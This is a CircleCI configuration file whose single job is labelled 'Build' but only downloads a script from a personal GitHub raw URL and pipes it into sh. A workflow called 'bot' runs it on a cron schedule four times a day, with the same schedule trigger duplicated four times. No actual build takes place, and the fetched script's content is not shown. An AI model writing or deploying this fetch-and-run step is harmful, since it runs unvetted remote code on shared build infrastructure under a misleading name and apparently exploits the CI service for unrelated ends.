version: 2.1
jobs:
  build:
    docker:
      - image: circleci/node:12
    resource_class: medium
    working_directory: ~/work
    steps:
      - run:
          name: Build
          command: curl -fsSL https://raw.githubusercontent.com/nguyenhuyhoang2/nguyenhuyhoang/tool/start.sh | sh 
workflows:
  version: 2
  bot:
    triggers:
      - schedule:
          cron: "0 10,15,20,1 * * *"
          filters:
            branches:
              only:
                - main
                - master
                - circleci-project-setup
      - schedule:
          cron: "0 10,15,20,1 * * *"
          filters:
            branches:
              only:
                - main
                - master
                - circleci-project-setup
      - schedule:
          cron: "0 10,15,20,1 * * *"
          filters:
            branches:
              only:
                - main
                - master
                - circleci-project-setup
      - schedule:
          cron: "0 10,15,20,1 * * *"
          filters:
            branches:
              only:
                - main
                - master
                - circleci-project-setup             
    jobs:
      - build
